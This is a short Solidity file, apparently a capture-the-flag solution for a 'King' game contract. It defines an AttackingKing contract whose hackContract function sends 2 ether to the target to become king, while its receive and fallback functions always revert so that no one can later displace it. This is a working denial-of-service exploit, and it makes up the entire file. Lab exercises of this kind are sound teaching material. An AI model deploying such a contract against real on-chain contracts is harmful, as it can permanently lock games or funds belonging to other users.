// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // we have to use call instead of transfer/send because the receive method needs more
        // than 2300 gas to execute
        payable(contractAddress).call{value: 2 ether}("");
    }

    receive() external payable {
        revert("sorry");
    }

    fallback() external payable {
        revert("sorry");
    }
}
